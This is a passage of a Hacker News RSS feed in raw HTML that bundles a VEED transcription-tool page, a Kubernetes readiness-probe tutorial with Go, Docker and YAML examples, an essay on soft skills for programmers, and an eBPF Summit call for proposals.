English, Spanish, French, Chinese, and many more</p></div><div id="w-node-be84c295ef3e-ccc0cf0b"><h3><strong>Video Transcription</strong></h3><p>You can also upload video files (in multiple formats) and create transcriptions, add subtitles, or download subtitle (.srt) files</p></div></div></div><div id="How-to"><div><h2>How to transcribe MP3 to text:</h2><p>Transcribe your MP3 in 3 easy steps</p></div><div><div><div><p><img src="https://uploads-ssl.webflow.com/5ea7ec2f0fe2ee14fc247bf0/5f3f9b7b5d102969e0f443e9_cloud.png" loading="lazy" width="32" alt=""></p><p><img src="https://uploads-ssl.webflow.com/5ea7ec2f0fe2ee14fc247bf0/5f3f9ba6edbc7fd0db328f8f_line.png" loading="lazy" width="2" alt=""></p></div><div><h3><strong>1. Upload</strong></h3><p>Upload your MP3 files to VEED. VEED is all online, no software required</p><p>‚Äç</p></div></div><div><div><p><img src="https://uploads-ssl.webflow.com/5ea7ec2f0fe2ee14fc247bf0/5f3f9b7a7679911e1f802d1d_scissors.png" loading="lazy" width="32" alt=""></p><p><img src="https://uploads-ssl.webflow.com/5ea7ec2f0fe2ee14fc247bf0/5f3f9ba6edbc7fd0db328f8f_line.png" loading="lazy" width="2" alt=""></p></div><div><h3><strong>2. Convert to text</strong></h3><p>Under ‚ÄòSubtitles‚Äô, click ‚ÄòAuto Subtitles‚Äô, choose your language, and that‚Äôs it! Your MP3 transcript is generated</p><p>‚Äç</p></div></div><div><div><p><img src="https://uploads-ssl.webflow.com/5ea7ec2f0fe2ee14fc247bf0/5f3f9b7afbaf558411481ae3_Share.png" loading="lazy" width="32" alt=""></p></div><div><h3><strong>3. Download</strong></h3><p>You can now download in multiple formats - .txt, .vtt, .srt - whatever you need</p></div></div></div><div><div><p><h4>How to use VEED - Make social media video content online</h4><h5>591 views</h5></p></div></div></div><div id="use-cases"><div><h2>Why use our MP3 to Text tool?</h2><p>Turn your MP3s into text files, automatically</p></div><div><div><h3><strong>Quick</strong></h3><p>No need to download any software, you don't even need an account. Get started right away, with our super-fast MP3 to Text tool</p></div><div><h3><strong>Easy</strong></h3><p>You can create transcriptions of your MP3 with a single click, and make line-by-line edits with ease</p></div><div><h3><strong>Versatile</strong></h3><p>You can export your MP3 transcription as a text file, subtitle file, whatever you need</p></div></div></div><div id="testimonials"><div><p><img src="https://uploads-ssl.webflow.com/5ea7ec2f0fe2ee14fc247bf0/5f3fcd9f6ea642218575ff6d_quote.png" loading="lazy" width="28" alt=""></p><h2>What they say about <span>VEED</span></h2></div><div><div data-animation="slide" data-duration="500" data-infinite="1"><div><div><div><div><p>Veed is a great piece of browser software with the best team I've ever seen.</p><p>‚Äç</p><p>Veed allows for subtitling, editing, effect/text encoding, and many more advanced features that other editors just can't compete with. The free version is wonderful, but the Pro version is beyond perfect. Keep in mind that this a browser editor we're talking about and the level of quality that Veed allows is stunning and a complete game changer at worst.</p></div><p><strong>Chris Y.</strong></p></div></div><div><div><div><p>I love using VEED&nbsp;as the speech to subtitles transcription is the most accurate I've seen on the market.</p><p>‚Äç</p><p>It has enabled me to edit my videos in just a few minutes and bring my video content to the next level</p></div><p><strong>Laura Haleydt</strong> - Brand Marketing Manager, Carlsberg Importers</p></div></div><div><div><div><p>The Best &amp; Most Easy to Use Simple Video Editing Software!</p><p>‚Äç</p><p>I had tried tons of other online editors on the market and been disappointed. With VEED I haven't experienced any issues with the videos I create on there.</p><p>‚Äç</p><p>It has everything I need in one place such as the progress bar for my 1-minute clips, auto transcriptions for all my video content, and custom fonts for consistency in my visual branding.</p></div><p><strong>Diana B - </strong>Social Media Strategist, Self Employed</p></div></div></div></div></div></div><div id="more-things"><div><div><h2><strong>More than just an MP3 to Text tool</strong></h2><p>VEED is so much more than just an MP3 to Text converter - you can edit and create all kinds of video and audio. Create YouTube video intros, auto-generate subtitles, create Instagram Stories with links and stickers, add sound effects to your audio, join MP3 files together, and so much more!</p></div><p><img src="https://uploads-ssl.webflow.com/5ea7ef450fe2ee1a3524891b/5efcc39090c5db4fed168b7a_ezgif.com-webp-to-png%20(1).png" alt="" sizes="100vw" srcset="https://uploads-ssl.webflow.com/5ea7ef450fe2ee1a3524891b/5efcc39090c5db4fed168b7a_ezgif.com-webp-to-png%20(1)-p-500.png 500w, https://uploads-ssl.webflow.com/5ea7ef450fe2ee1a3524891b/5efcc39090c5db4fed168b7a_ezgif.com-webp-to-png%20(1)-p-800.png 800w, https://uploads-ssl.webflow.com/5ea7ef450fe2ee1a3524891b/5efcc39090c5db4fed168b7a_ezgif.com-webp-to-png%20(1)-p-1080.png 1080w, https://uploads-ssl.webflow.com/5ea7ef450fe2ee1a3524891b/5efcc39090c5db4fed168b7a_ezgif.com-webp-to-png%20(1).png 1600w"></p></div></div></div></div>]]>
            </description>
            <link>https://www.veed.io/tools/mp3-to-text#hn</link>
            <guid isPermaLink="false">hacker-news-small-sites-24578053</guid>
            <pubDate>Thu, 24 Sep 2020 12:44:09 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Resilient Kubernetes Deployments with Readiness Probes]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24577917">thread link</a>) | @rotemtam
<br/>
September 24, 2020 | https://rotemtam.com/2020/09/24/kubernetes-readiness-probes/ | <a href="https://web.archive.org/web/*/https://rotemtam.com/2020/09/24/kubernetes-readiness-probes/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <article>
  
  <time datetime="2020-09-24T00:00:00+00:00">24 Sep 2020</time>
  <h3 id="introduction">Introduction</h3>

<blockquote><p lang="en" dir="ltr">Let's stop fooling ourselves. What we call CI/CD is actually only CI.</p>‚Äî Ant(on) Weiss (@antweiss) <a href="https://twitter.com/antweiss/status/1308108094157787136?ref_src=twsrc%5Etfw">September 21, 2020</a></blockquote>


<p>Containers make CI much more manageable: reproducible, isolated build environments that create portable and predictable deployment artifacts. Continuously delivering containers to production turns out to be quite a difficult problem which we call collectively <em>container orchestration.</em></p>

<p>What do we need for continuous delivery? An automated and safe way of applying changes to our production environments. In the early days of containers, I once wrote a Node.js server that ssh‚Äôd into a host, updated a docker-compose manifest, and ran a restart command every time a new user signed up for service. (It was automated, but not particularly safe, let me just say)</p>

<p>The first time I heard about Kubernetes was when a team of actually talented engineers inherited my monstrosity and went on to build a proper system that would not crash and burn five times a day. Organizations turn to Kubernetes to facilitate container-based, automated, and safe delivery.</p>

<p>Kubernetes is truly an amazing piece of software, being the brainchild of some <a href="https://k8s.devstats.cncf.io/d/24/overall-project-statistics?orgId=1">10k committers</a> it has grown into a very complete platform for organizations to run containerized applications, with very fine-grained configuration options.  The problem is, that once you have so many options in your hands, some of the permutations that you can roll out can be wrong, or incomplete: failing to set correct configuration options can lead to sub-optimal (or even destructive) behavior of your applications.</p>

<p>Today I want to discuss one feature in the Kubernetes API which I have found to be particularly important to make our applications more resilient in production: <em>readiness probes.</em></p>

<h3 id="our-dummy-application">Our Dummy Application</h3>

<p>For the purpose of this post, we will be exploring different configuration options  of the Kubernetes Deployment API by playing with a tiny webserver example written in Go, this is the baseline:</p>

<div><div><pre><code><span>package</span> <span>main</span>

<span>import</span> <span>(</span>
	<span>"fmt"</span>
	<span>"log"</span>
	<span>"net/http"</span>
<span>)</span>

<span>func</span> <span>main</span><span>()</span> <span>{</span>
	<span>http</span><span>.</span><span>HandleFunc</span><span>(</span><span>"/"</span><span>,</span> <span>func</span><span>(</span><span>w</span> <span>http</span><span>.</span><span>ResponseWriter</span><span>,</span> <span>r</span> <span>*</span><span>http</span><span>.</span><span>Request</span><span>)</span> <span>{</span>
		<span>fmt</span><span>.</span><span>Fprint</span><span>(</span><span>w</span><span>,</span> <span>"Hello, Kubernetes!"</span><span>)</span>
	<span>})</span>
	<span>log</span><span>.</span><span>Fatal</span><span>(</span><span>http</span><span>.</span><span>ListenAndServe</span><span>(</span><span>":8080"</span><span>,</span> <span>nil</span><span>))</span>
<span>}</span>
</code></pre></div></div>

<p>To build it into a Docker image which we can then deploy to a Kubernetes cluster, we will use this Dockerfile:</p>

<div><div><pre><code><span># build the binary using a normal golang image</span>
<span>FROM</span><span> golang:1.15-buster as build</span>

<span>WORKDIR</span><span> /go/src/app</span>
<span>ADD</span><span> . /go/src/app</span>

<span>RUN </span>go build <span>-o</span> /go/bin/app

<span># then copy the binary distroless image</span>
<span>FROM</span><span> gcr.io/distroless/base-debian10</span>
<span>COPY</span><span> --from=build /go/bin/app /</span>
<span>CMD</span><span> ["/app"]</span>
</code></pre></div></div>

<p>In the above example, we are using a Docker multi-stage build, to first build the server binary in a <code>golang</code> image, and then copy it to a barebones <a href="https://github.com/GoogleContainerTools/distroless">distroless</a> docker image, in order to keep the size of the image minimal and reduce deployment times associated with resource downloads.</p>

<p>To build and push it to Public DockerHub:</p>

<div><div><pre><code>$ docker build -t rotemtam/k8s-deployment-blogpost:baseline .
$ docker push rotemtam/k8s-deployment-blogpost:baseline
</code></pre></div></div>

<h3 id="what-is-the-purpose-of-deployment-objects">What is the purpose of Deployment objects?</h3>

<figure>
    <img src="https://rotemtam.com/assets/deployment-rs-pod.png" alt="Source ">
    <figcaption>Source </figcaption>
  </figure>

<p><small>Source: <a href="http://wiki.ciscolinux.co.uk/index.php?title=Kubernetes/Deployment,_ReplicaSet_and_Pod">wiki.ciscolinux.co.uk</a></small></p>

<p>The Kubernetes designers did a fine job of providing us with an <em>Orthogonal Design</em>, that is, each part of the API is responsible for a specific task, and <em>only it</em> is responsible for that task. This is what the hierarchy looks like:</p>

<ul>
  <li><a href="https://kubernetes.io/docs/concepts/workloads/pods/">Pods</a> are the basic unit of scheduling compute, they are ephemeral and short-lived. They specify how to run a group of containers on a host. It is the Kubernetes control plane‚Äôs responsibility to then schedule this Pod on a specific node and run it.</li>
  <li><a href="https://kubernetes.io/docs/concepts/workloads/controllers/replicaset/">ReplicaSets</a> are simple controllers whose task is to keep maintaining a specific amount of pods of a certain PodSpec up and running on the cluster. If a pod dies, and there is now a gap between the desired state (I want 3 of this thing running) and current state (I now have only 2 of this thing running), it is the ReplicaSet‚Äôs responsibility to schedule a new pod of said spec in its place. A ReplicaSet lives longer than a pod, but it is (usually) pinned to a specific spec the RS lives for the lifetime of a <em>revision</em> of your application.</li>
  <li>A <a href="https://kubernetes.io/docs/concepts/workloads/pods/s">Deployment</a> is a high-level construct that is supposed to live for the entire lifecycle of an application, through many versions and releases. Deployments control how a cluster <em>rolls out</em> a new revision and allow for version <em>rollbacks</em> if needed. So unless you have some very specific orchestration requirements, your interface to scheduling (stateless) applications onto your cluster should be through the Deployment API. (for deploying stateful applications we use a s similar API - <code>StatefulSet</code>)</li>
</ul>

<h3 id="our-baseline-deployment-object">Our baseline Deployment object</h3>

<p>A minimal example for a deployment of our application would be:</p>

<div><div><pre><code><span># declare the object type: </span>
<span>apiVersion</span><span>:</span> <span>apps/v1</span>
<span>kind</span><span>:</span> <span>Deployment</span>

<span># define metadata about our deployment</span>
<span>metadata</span><span>:</span>
  <span>name</span><span>:</span> <span>webserver-deployment</span>
  <span>labels</span><span>:</span>
    <span>app</span><span>:</span> <span>webserver-deployment</span>

<span># define the spec for our deployment </span>
<span>spec</span><span>:</span>
  <span>replicas</span><span>:</span> <span>3</span>
  <span>selector</span><span>:</span>
    <span>matchLabels</span><span>:</span>
      <span>app</span><span>:</span> <span>webserver-deployment</span>

  <span># define the template for the Pods created by this deployment</span>
  <span>template</span><span>:</span>
    <span>metadata</span><span>:</span>
      <span>labels</span><span>:</span>
        <span>app</span><span>:</span> <span>webserver-deployment</span>
    <span>spec</span><span>:</span>
      <span>containers</span><span>:</span>
      <span># define a single container</span>
      <span>-</span> <span>name</span><span>:</span> <span>webserver</span>
        <span># using our pushed docker image</span>
        <span>image</span><span>:</span> <span>rotemtam/k8s-deployment-blogpost:baseline</span>
        <span>ports</span><span>:</span>
        <span># expose port 8080</span>
        <span>-</span> <span>containerPort</span><span>:</span> <span>8080</span>
</code></pre></div></div>

<p>To be able to make requests against our app we will expose it with a <code>Service</code> object:</p>

<div><div><pre><code><span># service.yaml:</span>
<span>apiVersion</span><span>:</span> <span>v1</span>
<span>kind</span><span>:</span> <span>Service</span>
<span>metadata</span><span>:</span>
  <span>name</span><span>:</span> <span>k8s-blogpost-svc</span>
<span>spec</span><span>:</span>
  <span>selector</span><span>:</span>
    <span>app</span><span>:</span> <span>webserver-deployment</span>
  <span>ports</span><span>:</span>
    <span>-</span> <span>protocol</span><span>:</span> <span>TCP</span>
      <span>port</span><span>:</span> <span>8080</span>
      <span>targetPort</span><span>:</span> <span>8080</span>
</code></pre></div></div>

<p>To test that everything is up and running:</p>

<div><div><pre><code>$ kubectl run curl --image=curlimages/curl --rm --restart=Never -it curl http://k8s-blogpost-svc:8080

Hello, Kubernetes!
</code></pre></div></div>

<p>Hooray!</p>

<h3 id="dealing-with-slow-starting-containers">Dealing with slow starting containers</h3>

<p><img src="https://media.giphy.com/media/3o6MbnqLhX5tJ5wNQQ/giphy.gif" alt="https://media.giphy.com/media/3o6MbnqLhX5tJ5wNQQ/giphy.gif"></p>

<p>Assume that our server needs to perform some initial work before it is ready to serve traffic, perhaps it is downloading some data from storage and processing it into an in-memory data structure which it uses to answer queries. The way Kubernetes works by default is that traffic will be routed to our Pod as soon as the main process in at least one of its containers (not including initContainers) is running. This means that there will be a period of time in which traffic is routed to our Pod without it being able to serve traffic; depending on the <a href="https://kubernetes.io/docs/concepts/services-networking/service/#virtual-ips-and-service-proxies">kube-proxy mode</a> of our clusters, this could result in a spike of 5xx errors whenever a new Pod is scheduled successfully.</p>

<p>To see this in action, let‚Äôs modify our webserver code such that it is slow to start by adding a sleep before starting the webserver:</p>

<div><div><pre><code><span>package</span> <span>main</span>

<span>import</span> <span>(</span>
	<span>"fmt"</span>
	<span>"log"</span>
	<span>"net/http"</span>
	<span>"time"</span>
<span>)</span>

<span>func</span> <span>main</span><span>()</span> <span>{</span>
	<span>fmt</span><span>.</span><span>Println</span><span>(</span><span>"Taking a nap.."</span><span>)</span>
	<span>time</span><span>.</span><span>Sleep</span><span>(</span><span>time</span><span>.</span><span>Second</span> <span>*</span> <span>30</span><span>)</span>
	<span>fmt</span><span>.</span><span>Println</span><span>(</span><span>"Ready to serve traffic!"</span><span>)</span>
	<span>http</span><span>.</span><span>HandleFunc</span><span>(</span><span>"/"</span><span>,</span> <span>func</span><span>(</span><span>w</span> <span>http</span><span>.</span><span>ResponseWriter</span><span>,</span> <span>r</span> <span>*</span><span>http</span><span>.</span><span>Request</span><span>)</span> <span>{</span>
		<span>fmt</span><span>.</span><span>Fprint</span><span>(</span><span>w</span><span>,</span> <span>"Hello, Kubernetes!"</span><span>)</span>
	<span>})</span>
	<span>log</span><span>.</span><span>Fatal</span><span>(</span><span>http</span><span>.</span><span>ListenAndServe</span><span>(</span><span>":8080"</span><span>,</span> <span>nil</span><span>))</span>
<span>}</span>
</code></pre></div></div>

<p>Building and pushing the new version:</p>

<div><div><pre><code>$ docker build -t rotemtam/k8s-deployment-blogpost:slow-boot .
$ docker push rotemtam/k8s-deployment-blogpost:slow-boot
</code></pre></div></div>

<p>Modifying our deployment yaml to change the docker image:</p>

<div><div><pre><code><span># ... unchanged stuff</span>
    <span>spec</span><span>:</span>
      <span>containers</span><span>:</span>
      <span># define a single container</span>
      <span>-</span> <span>name</span><span>:</span> <span>webserver</span>
        <span># using our pushed docker image</span>
        <span>image</span><span>:</span> <span>rotemtam/k8s-deployment-blogpost:slow-boot</span>
<span># more unchanged stuff ...</span>
</code></pre></div></div>

<p>If we immediately run our curl command we will see:</p>

<div><div><pre><code><span>$ </span>kubectl run curl <span>--image</span><span>=</span>curlimages/curl <span>--rm</span> <span>--restart</span><span>=</span>Never <span>-it</span> curl http://k8s-blogpost-svc:8080

curl: <span>(</span>7<span>)</span> Failed to connect to k8s-blogpost-svc port 8080: Connection refused
</code></pre></div></div>

<p>How does this happen?</p>

<ol>
  <li>We update the Deployment object with a new PodSpec</li>
  <li>The Deployment creates a new ReplicaSet for the new revision and rolls out the new pods</li>
  <li>As new pods from the new ReplicaSet enter the <code>Ready</code> state, old ones from the existing one are terminated.</li>
  <li>As soon as pods are in a Ready state, they are connected to the <code>k8s-blogpost-svc</code> Service and will get traffic directed to them.</li>
  <li>We make our <code>curl</code> calls from within the cluster and try to connect to port 8080 in our new pods, but they are still asleep waiting for their 30-second nap to end before opening the webserver socket.</li>
  <li>We get a <code>connection refused</code> error message.</li>
</ol>

<p>How do we mitigate this? If we examine the flow of events, it is easy to see that the culprit is on step 4: <em>‚ÄúAs soon as the pods are in ready state‚Äù.</em> Kubernetes thinks our app is <em>ready,</em> (because the container image has downloaded and the process started successfully), when it obviously isn‚Äôt. Surely there must be a way to make Kubernetes aware <em>when</em> it should transition a Pod‚Äôs state to Ready!</p>

<p>Luckily, when we define a deployment‚Äôs PodSpec, we can specify for each container something called a <code>readinessProbe</code>, the docs state it is a ‚ÄúPeriodic probe of container service readiness. Container will be removed from service endpoints if the probe fails‚Äù and that it is of type <a href="https://kubernetes.io/docs/reference/generated/kubernetes-api/v1.18/#probe-v1-core">Probe v1 Core</a>, which  ‚Äúdescribes a health check to be performed against a container to determine whether it is alive or ready to receive traffic.‚Äù</p>

<p>The probe object is quite rich, allowing us to run arbitrary commands in the container, make HTTP requests, and more. In our example, it would be beneficial to make sure the webserver TCP socket is open before we start directing traffic at it. We could do this by changing our deployment to look like:</p>

<div><div><pre><code><span># ... </span>
    <span>spec</span><span>:</span>
      <span>containers</span><span>:</span>
      <span># define a single container</span>
      <span>-</span> <span>name</span><span>:</span> <span>webserver</span>
        <span># using our pushed docker image</span>
        <span>image</span><span>:</span> <span>rotemtam/k8s-deployment-blogpost:slow-boot</span>
        <span>ports</span><span>:</span>
        <span># expose port 8080</span>
        <span>-</span> <span>containerPort</span><span>:</span> <span>8080</span>

        <span># wait 30s, then every 5s check if the port is ready</span>
        <span>readinessProbe</span><span>:</span>
          <span>tcpSocket</span><span>:</span>
            <span>port</span><span>:</span> <span>8080</span>
          <span>initia‚Ä¶</span></code></pre></div></div></article></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://rotemtam.com/2020/09/24/kubernetes-readiness-probes/">https://rotemtam.com/2020/09/24/kubernetes-readiness-probes/</a></em></p>]]>
            </description>
            <link>https://rotemtam.com/2020/09/24/kubernetes-readiness-probes/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24577917</guid>
            <pubDate>Thu, 24 Sep 2020 12:28:00 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Important non-programming skills for programmers]]>
            </title>
            <description>
<![CDATA[
Score 86 | Comments 69 (<a href="https://news.ycombinator.com/item?id=24577876">thread link</a>) | @IncRnd
<br/>
September 24, 2020 | https://welearncode.com/most-important-nonprogramming/ | <a href="https://web.archive.org/web/*/https://welearncode.com/most-important-nonprogramming/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p><a href="https://welearncode.com/">‚Üê Home</a></p><p>When I think about who I would like to work with as a programmer, I think so much more about non-technical skills than technical skills that make somebody a good co-worker. In fact, all of the skills that are in this post contribute to writing good code that improves technical projects. Most of them are really helpful for careers outside of programming too, but I'm going to focus on why they're useful for programmers specifically.</p><h2>Empathy</h2><p>To build a great product, you must put yourself in the shoes of your users. How will they be using your product? What features will be helpful for them? How can your program help them or improve their lives? And -- conversely -- how could it harm them or negatively impact their lives? What are the ethical implications of your application?</p><p>Empathy is essential for so many pieces of your programs -- if they aren't secure then your user's information could be used negatively by a third party. If they aren't accessible, then you are limiting the number of people that can use your project. If they run slowly or needs huge amounts of bandwidth to run, then users will leave and people in areas with slow internet or mobile users won't be able to run them. It seems like every day an article comes out with some harmful algorithm a company has implemented, like the <a href="https://www.theguardian.com/media/2018/sep/18/report-youtubes-alternative-influence-network-breeds-rightwing-radicalisation">YouTube algorithm radicalizing the alt-right</a>, <a href="https://www.inc.com/guadalupe-gonzalez/amazon-artificial-intelligence-ai-hiring-tool-hr.html">Amazon creating a sexist hiring algorithm (which they didn't end up using)</a>, or <a href="https://www.youtube.com/watch?v=QxuyfWoVV98">AI misgendering black women</a>. Think about everybody when you are writing your code!</p><p>Also, empathy is helpful for being a team member and a mentor. Put yourself in your manager or another developer's shoes. Why are they making their decisions? What can you do to help them? Having empathy will definitely improve your ability to be an effective teammate. If you're an employer, you can retain your employees for longer, and they will be more effective workers if you display empathy <a href="https://www.forbes.com/sites/karenhigginbottom/2018/05/31/why-empathy-matters-in-the-workplace/#386ca65d1130">(src)</a>.</p><p>Have patience for other programmers, especially ones that are learning new things. Remind yourself of something that was really hard for you to learn and how that felt. They probably feel similarly. Being rude to them, diminishing their progress, or being pedantic will only be harmful and make that process harder for them.</p><p><strong>Your words and actions have real consequences -- you can use that to enact positive change or hurt somebody. That doesn't end with in-person communication -- online communication counts too. You may think you're being funny or just letting off steam, but you may actually causing a very negative impact on someone's life. It's up to you to decide how to act, and how to apologize if you hurt someone to undo some of that harm.</strong></p><h2>Problem Solving</h2><p>When I teach people to code, I see a lot more people struggling with problem-solving than the code itself. The ability to break a problem into smaller ones and then solve all of those smaller problems takes a lot of practice. Getting good at problem-solving can help you become a much stronger programmer.</p><p>Also, for most problems, there will be more than one solution. A large part of our jobs as software developers is to think through those different solutions and choose the one that is best. Is one faster to implement? Or does it run more efficiently? Or will it be less expensive? All of these are important questions, and picking the correct solution is a challenging but important part of software development.</p><h2>Collaboration</h2><p>Chances are very high that you with other people as a programmer. You will have to work with other developers, business people, managers, open source contributors, stakeholders, and countless other people even if you are a freelancer or entrepreneur. Learning how to work well with different people and their personalities is critical.</p><p>There are so many things that contribute to good collaboration. The first is knowing that one person can't do everything, or at least do everything well. Different people have different skills, points of view, and life experiences that are more powerful in combination than isolation. Don't feel like you always need to "put the team on your back" or be everything to everybody. You can be a lot better if you allow other people to contribute too.</p><p>Ask other people for help, and be willing to help people in return. You don't need to be an expert in everything, and different people will be experts in different things. Rely on other people, and if you are stuck on something make sure to ask for help so that you don't stay stuck for too long. When somebody asks you for help, be willing to help them. You can learn a lot by explaining things well, and you will be able to reinforce your knowledge of the topic. If you're in a management position, make sure to give people time for mentorship and effective collaboration!</p><p>Along the same lines, don't talk over people or immediately dismiss their viewpoints. They will probably be much less likely to contribute in the future if their opinions aren't valued or taken into account. Actively listen when people share their ideas -- instead of thinking about your response or why your idea is better while they are talking, try to think about why their approach is also good or how it could be implemented.</p><p>Then, once you implement their awesome ideas, give them credit for those ideas. Nothing has made me less effective as an employee as being on a team where my ideas were dismissed, under-valued, and un-credited by other people on my team.</p><h2>Communication</h2><p>When you are working with other people, whether those people are co-workers, clients, the people who use your projects, managers, or people you manage, good communication is crucial. Give honest updates on how things are going, where projects currently stand, and your opinions on things honestly but kindly. People will be less receptive to feedback if you are rude or unconstructive. But, if you are dishonest or sugar-coat the truth, then you may not see a positive change. There's definitely a fine line here.</p><p>One real life example from my life: I had somebody who read one of my blog posts write a very long letter about how dumb I sound because of the tone I take. I usually use a lot of exclamation points and try to sound exciting in my posts -- and that's very intentional to try and make topics that can be intimidating or boring more fun. The person got pretty sexist in this email and said some pretty hurtful things. That being said, I probably could scale back on the exclamation points and still get people excited about programming. I would have been a lot more receptive to that point if the person had framed the criticism more constructively.</p><p>If things are not going well, make sure to say so. Be honest about needing a deadline pushed back, or how something isn't going well at work. You will have a much better chance at changing it and making the environment better for yourself if you speak up.</p><h2>Inclusiveness</h2><p>I used to work as a rock climbing instructor and counselor at a summer camp, and the age group I worked with most were middle school girls. They were some of my favorite people I've ever worked with, but, that being said, middle schoolers aren't usually the most accepting of difference or that clique-adverse. We used to run a game where we started out in one large circle, and then one counselor would tell people they were "out of the circle", and they would have to leave the game based on some characteristic that they weren't informed of and couldn't control. The people still inside the circle would play a game, and the people outside of the circle were excluded and just had to watch from afar.</p><p>This activity was super effective in showing these girls what it was like to be left out for reasons outside of your control, and I still think back on it a lot. As adults, we still leave people out of the circle and exclude them based on certain characteristics outside their control, but if we let them back into the circle and allow them to contribute then our products draw on more diverse experiences and are better. <strong>There's <a href="https://hbr.org/2016/11/why-diverse-teams-are-smarter">a lot of research</a> on more diverse teams performing better, but from an individual perspective, think about what it feels like to be left out of the circle and try to make your circle larger, not smaller.</strong> Chances are, a lot of your users may be people that have traditionally been left out of the circle in tech. I can tell you from my own experience, that it's really difficult to be the only person like you on a team as someone who's been on a team with another woman for ~5% of my programming career.</p><p>This also links into empathy -- make sure that you are making your programs for a wide variety of users. Not just the able-bodied or those with cutting-edge internet or technologies. You will be able to reach more people.</p><h2>Patience</h2><p>The first person that you need to have patience with when you are programming is yourself. <strong>Programming is hard</strong> and sometimes you will have bugs or difficult problems to overcome. If it's always easy, then you aren't challenging yourself, and you aren't growing as a programmer. Have the tenacity to keep working through a problem and not give up when it gets hard. But, also, know that you can take a break and come back to the problem in a little while. Maybe taking a break will help you solve the problem more efficiently or to see it differently when you come back to it.</p><p>Also, be patient with other people. Things can take a while to learn and people are not perfect. Making mistakes and failing can be some of the most important experiences in the learning process, so allow for that instead of creating an environment where it isn't safe to take risks or grow. Understand that different things click more easily for different people, and know that learning can take a while.</p><h2>Creativity</h2><p>My favorite thing about being a programmer is that I get to use my creative energy to build things that other people can then benefit from. You get to think outside of the box to create really cool things.</p><p>Having creative ideas is important for coming up with ‚Ä¶</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://welearncode.com/most-important-nonprogramming/">https://welearncode.com/most-important-nonprogramming/</a></em></p>]]>
            </description>
            <link>https://welearncode.com/most-important-nonprogramming/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24577876</guid>
            <pubDate>Thu, 24 Sep 2020 12:21:56 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[An Introduction to SCION]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24577659">thread link</a>) | @matzf
<br/>
September 24, 2020 | https://www.sidnlabs.nl/en/news-and-blogs/new-internet-infrastructures-an-introduction-to-scion | <a href="https://web.archive.org/web/*/https://www.sidnlabs.nl/en/news-and-blogs/new-internet-infrastructures-an-introduction-to-scion">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://www.sidnlabs.nl/en/news-and-blogs/new-internet-infrastructures-an-introduction-to-scion</link>
            <guid isPermaLink="false">hacker-news-small-sites-24577659</guid>
            <pubDate>Thu, 24 Sep 2020 11:49:31 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[EBPF Summit 2020 ‚Äì CFP is now open]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24577647">thread link</a>) | @tgraf
<br/>
September 24, 2020 | https://ebpf.io/ebpf-summit-2020-cfp/ | <a href="https://web.archive.org/web/*/https://ebpf.io/ebpf-summit-2020-cfp/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="___gatsby"><div tabindex="-1" id="gatsby-focus-wrapper"><div><div><div><div><div><p><span>October  28-29th, 2020</span><span>|</span><span>A Free Virtual Event</span></p><p>Call For Proposals</p><p>We‚Äôre excited to announce that the call for proposals is now open for the inaugural eBPF Summit, a virtual event, targeted at DevOps, platform architects and developers.</p><p>The summit is offered at no cost, and will include keynotes from those leading the open source eBPF community including eBPF power-users as well as user lightning talks. Participants will have a chance to ask questions to the speakers and chat with peers on a Slack forum. We‚Äôre inviting eBPF users, contributors and community members to participate in this virtual gathering.</p></div></div><div><h2>About the eBPF Summit</h2><p>eBPF is quickly becoming one of the most talked about technologies in our industry - enabling a new generation of networking, tracing, observability and security infrastructure. The eBPF Summit is targeted at users and potential users of this groundbreaking technology - both those looking at leveraging eBPF directly or via one of the projects leveraging eBPF (e.g. bpftrace, Cilium, Falco etc.).</p></div><div><h2>Confirmed Keynote Speakers</h2><div><div><p><img src="https://ebpf.io/static/alexey-starovoitov-8f8f40922a4ab69a1153f7920aa30952.png" alt="Alexei Starovoitov"></p><h3>Alexei Starovoitov</h3><div><p>Co-maintainer eBPF,</p><p>Facebook</p></div></div><div><p><img src="https://ebpf.io/static/brendan-gregg-95ac4a84726a2854fc08eeccf4efb3cc.png" alt="Brendan Gregg"></p><h3>Brendan Gregg</h3><div><p>Author of ‚ÄúBPF Performance Tools‚Äú,</p><p>Lead Performance Engineer,</p><p>Netflix</p></div></div><div><p><img src="https://ebpf.io/static/daniel-borkmann-ad8ea1cea4487752aee473cdfeab64db.png" alt="Daniel Borkmann"></p><h3>Daniel Borkmann</h3><div><p>Co-maintainer eBPF,</p><p>Isovalent</p></div></div><div><p><img src="https://ebpf.io/static/david-miller-472d128f44319f988ddbdba9bd0b2898.png" alt="David Miller"></p><h3>David Miller</h3><div><p>Linux Kernel Networking Maintainer,</p><p>Red Hat</p></div></div><div><p><img src="https://ebpf.io/static/kris-nova-64d0ee6f9b5fcc0b94bec82140b99699.png" alt="Kris Nova"></p><h3>Kris Nova</h3><div><p>Chief Open Source Advocate,</p><p>Sysdig</p></div></div><div><p><img src="https://ebpf.io/static/kp-singh-1d454c6f8fee13c6fd90163f291b50b1.png" alt="KP Singh"></p><h3>KP Singh</h3><div><p>Kernel Runtime Security,</p><p>Google</p></div></div><div><p><img src="https://ebpf.io/static/laurent-bernaille-696ad3565b2ed182fd170a366c058d08.png" alt="Laurent Bernaille"></p><h3>Laurent Bernaille</h3></div><div><p><img src="https://ebpf.io/static/liz-rice-6b8760303d3ddf1923cb7d34f3d0bb2d.png" alt="Liz Rice"></p><h3>Liz Rice</h3><div><p>VP, Open Source Engineering,</p><p>Aqua</p></div></div><div><p><img 